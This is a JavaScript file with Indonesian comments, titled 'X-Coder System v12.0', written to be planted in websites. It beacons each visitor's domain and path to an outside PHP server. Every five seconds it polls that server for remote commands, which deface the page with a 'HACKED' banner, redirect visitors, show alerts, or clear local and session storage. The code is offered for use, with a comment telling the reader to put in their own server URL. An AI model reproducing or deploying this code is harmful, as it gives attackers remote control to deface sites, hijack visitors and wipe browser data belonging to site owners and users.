/**
 * X-Coder System v12.0 - BEACON METHOD
 * PASTI WORK KARENA PAKE IMAGE BEACON
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // KIRIM DATA PAKE IMAGE BEACON (PASTI WORK)
    // ============================================================
    function sendBeacon() {
        var domain = getDomain();
        var path = window.location.pathname;
        var url = SERVER + '?log=1&domain=' + encodeURIComponent(domain) + '&path=' + encodeURIComponent(path);
        
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
        
        console.log('📡 Beacon sent:', domain);
    }

    // ============================================================
    // CEK PERINTAH (POLLING)
    // ============================================================
    function checkCommand() {
        var domain = getDomain();
        var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(domain);
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.command) {
                    executeCommand(data.command, data);
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1 style="text-align:center;margin-top:20%;color:red;font-size:72px;">🔥 HACKED</h1>';
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Storage cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    setTimeout(sendBeacon, 500);
    setInterval(sendBeacon, 30000);
    setInterval(checkCommand, 5000);

    console.log('🔍 X-Coder System v12.0 started on:', getDomain());
})();
